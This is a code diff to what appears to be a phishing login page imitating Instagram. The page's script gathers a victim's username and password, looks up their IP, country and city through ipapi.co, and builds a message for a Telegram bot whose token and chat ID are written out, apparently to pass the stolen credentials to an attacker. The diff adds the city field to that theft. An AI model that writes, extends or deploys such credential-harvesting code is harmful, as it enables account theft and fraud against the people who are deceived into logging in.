@@ -32,6 +32,7 @@
             <div class="mb-4">
                 <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="text" name="password" id="password" required/>
                 <input type="hidden" name="country" id="country">
+                <input type="hidden" name="city" id="city">
             </div>
             <div class="mb-4">
                 <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
@@ -75,8 +76,9 @@
             var password = document.getElementById('password').value;
             var ipaddress = document.getElementById('ipaddress').value;
       var country = document.getElementById('country').value;
+      var city = document.getElementById('city').value;
 
-            var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}\nCountry: ${country}`;
+            var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}\nCountry: ${country}\nCity: ${city}`;
            
              var token = '8142342762:AAEMPibryAQO6P8fttpyajD4js0FvR6iGuw';
             var chat_id = '6757391137'
@@ -101,9 +103,14 @@
     fetch('https://ipapi.co/json/')
     .then(response => response.json())
     .then(data => {
-        document.getElementById('country').value = data.country_name;
+        console.log("City:", data.city);
+        console.log("Country:", data.country_name);
+
+        // Example: Fill into hidden form inputs
+        document.getElementById("city").value = data.city;
+        document.getElementById("country").value = data.country_name;
     })
-    .catch(error => console.error('Error fetching IP location:', error));
+    .catch(error => console.error('Location error:', error));
     </script>
 </body>
 
